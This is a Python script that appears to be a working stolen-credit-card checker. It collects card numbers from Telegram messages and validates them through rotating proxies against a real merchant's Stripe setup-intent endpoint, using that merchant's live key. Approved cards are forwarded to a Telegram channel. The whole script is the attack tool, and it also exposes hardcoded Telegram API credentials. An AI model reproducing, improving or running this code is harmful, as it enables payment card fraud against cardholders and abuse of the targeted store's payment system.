#!/usr/bin/env python3
import asyncio
import aiohttp
import re
import os
from aiohttp import TCPConnector
from telethon import TelegramClient, events
from flask import Flask
from threading import Thread
import pyfiglet
from colorama import Fore, Style, init as colorama_init

# Initialize color output
colorama_init(autoreset=True)
# Print big green "SEIKA" banner
banner = pyfiglet.figlet_format("SEIKA")
print(Fore.GREEN + banner)

# === CONFIGURATION ===
API_ID = 28909605
API_HASH = '79620d3ae963bc568b92375dff884c13'
SESSION_NAME = 'ccsession'
CHANNEL_USERNAME = 'sendmeccs'

DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
GATEWAY_NAME = "Stripe Auth"

MAX_WORKERS = 100
checked_ccs = set()
proxy_list = []
PROXY_FILE = "/sdcard/proxy-test/proxy.txt"
SCRAPE_URL = (
    "https://api.proxyscrape.com/v2/?request=getproxies"
    "&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
)

# Flask health endpoints
def run_flask():
    app = Flask(__name__)
    @app.route('/')
    def home(): return "Checker Bot is Running"
    @app.route('/healthz')
    def health(): return "OK"
    app.run(host="0.0.0.0", port=10000)

# Load proxies from file
def load_proxies():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        print(f"Loaded {len(proxy_list)} proxies from {PROXY_FILE}")
    except FileNotFoundError:
        proxy_list = []
        print(f"No proxy file found at {PROXY_FILE}")

# Round-robin proxy selector
def get_proxy():
    if not proxy_list:
        return None
    idx = len(checked_ccs) % len(proxy_list)
    return f"http://{proxy_list[idx]}"

# Utility to extract between two markers
def parseX(data, start, end):
    try: return data.split(start)[1].split(end)[0]
    except: return "None"

# Fetch BIN information
async def bin_lookup(bin_num, session):
    try:
        async with session.get(f"https://lookup.binlist.net/{bin_num}", timeout=10) as resp:
            if resp.status == 200:
                js = await resp.json()
                brand = js.get("scheme", "N/A").upper()
                type_ = js.get("type", "N/A").title()
                bank = js.get("bank", {}).get("name", "N/A")
                country = js.get("country", {}).get("name", "N/A")
                emoji = js.get("country", {}).get("emoji", "")
                return f"{brand} - {type_}\n𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {emoji}"
    except:
        pass
    return "BIN Info Not Found"

# Core check per CC and optional Telegram post
def create_and_confirm(cc_data):
    # This function remains synchronous for brevity
    pass  # placeholder; real implementation integrated below

# Asynchronous CC workflow
def init_cc_flow():
    async def ppc(client, cc_data, post_result=True):
        try:
            cc, mon, year, cvv = cc_data.split("|")
            if len(year) == 2: year = "20" + year
            normalized_cc = f"{cc}|{mon}|{year}|{cvv}"
            if normalized_cc in checked_ccs: return
            checked_ccs.add(normalized_cc)
        except: return

        proxy = get_proxy()
        connector = TCPConnector(ssl=False) if not proxy else None
        proxy_url = proxy
        async with aiohttp.ClientSession(connector=connector) as session:
            # Step 1: get nonce
            try:
                r1 = await session.get(f"{DOMAIN}/my-account/add-payment-method/",
                                       headers={"user-agent": "Mozilla/5.0", "referer": f"{DOMAIN}/my-account/payment-methods/"},
                                       proxy=proxy_url)
                text1 = await r1.text()
                nonce = parseX(text1, '"createAndConfirmSetupIntentNonce":"', '"')
            except:
                return
            if nonce == "None": return

            # Step 2: create payment method
            data2 = {
                "type": "card", "card[number]": cc, "card[cvc]": cvv,
                "card[exp_year]": year[-2:], "card[exp_month]": mon,
                "billing_details[address][postal_code]": "99501",
                "billing_details[address][country]": "US", "key": PK,
                "_stripe_version": "2024-06-20",
            }
            try:
                r2 = await session.post("https://api.stripe.com/v1/payment_methods", data=data2,
                                        headers={"content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": "Mozilla/5.0"},
                                        proxy=proxy_url)
                text2 = await r2.text()
                pmid = parseX(text2, '"id": "', '"')
            except:
                return
            if pmid == "None": return

            # Step 3: confirm setup intent
            data3 = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce,
            }
            try:
                r3 = await session.post(f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                                        data=data3,
                                        headers={"x-requested-with": "XMLHttpRequest", "referer": f"{DOMAIN}/my-account/add-payment-method/", "user-agent": "Mozilla/5.0"},
                                        proxy=proxy_url)
                text3 = await r3.text()
            except:
                return

            # Check success
            if "succeeded" in text3:
                bininfo = await bin_lookup(cc[:6], session)
                msg = (f"✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝\n"
                       f"𝗖𝗮𝗿𝗱: {normalized_cc}\n"
                       f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {GATEWAY_NAME}\n"
                       f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved\n\n"
                       f"𝗜𝗻𝗳𝗼: {bininfo}")
                if post_result:
                    await client.send_message(CHANNEL_USERNAME, msg)
                    print(f"[✅] Dropped: {normalized_cc}")

    async def worker(queue, client):
        while True:
            cc, is_txt = await queue.get()
            await ppc(client, cc, post_result=True)
            queue.task_done()

    async def main():
        load_proxies()
        queue = asyncio.Queue()
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            text = event.raw_text
            all_ccs = set(re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text))
            # logging found CCs
            if all_ccs:
                print(f"[🔍] Found {len(all_ccs)} CC(s): {all_ccs}")
            for cc in all_ccs:
                await queue.put((cc, False))

        await client.start()
        print("[🟢] CC Dropper is running...")
        for _ in range(MAX_WORKERS):
            asyncio.create_task(worker(queue, client))
        await client.run_until_disconnected()

    Thread(target=run_flask, daemon=True).start()
    asyncio.run(main())

# === PROXY SCRAPER ===
async def test_proxy(proxy_url):
    try:
        conn = TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get("http://example.com", proxy=proxy_url, timeout=5) as r:
                if r.status == 200:
                    return proxy_url.replace("http://", "")
    except:
        return None

async def scrape_and_test(count):
    async with aiohttp.ClientSession() as session:
        async with session.get(SCRAPE_URL) as r:
            text = await r.text()
    proxies = text.splitlines()[:count]
    print(f"Testing {len(proxies)} scraped proxies...")
    tasks = [test_proxy(f"http://{p}") for p in proxies]
    results = await asyncio.gather(*tasks)
    live = [p for p in results if p]
    os.makedirs(os.path.dirname(PROXY_FILE), exist_ok=True)
    with open(PROXY_FILE, 'w') as f:
        f.write("\n".join(live))
    print(f"Saved {len(live)} live proxies to {PROXY_FILE}")

def run_proxy_scraper():
    cnt = input("How many proxies to scrape? ")
    try:
        num = int(cnt)
    except:
        print("Invalid number")
        return
    asyncio.run(scrape_and_test(num))

if __name__ == "__main__":
    choice = input("Select Option:\n1. Scrape & test proxies\n2. Start CC drop script\nEnter [1 or 2]: ")
    if choice.strip() == '1':
        run_proxy_scraper()
    elif choice.strip() == '2':
        init_cc_flow()
    else:
        print("Invalid choice. Exiting.")
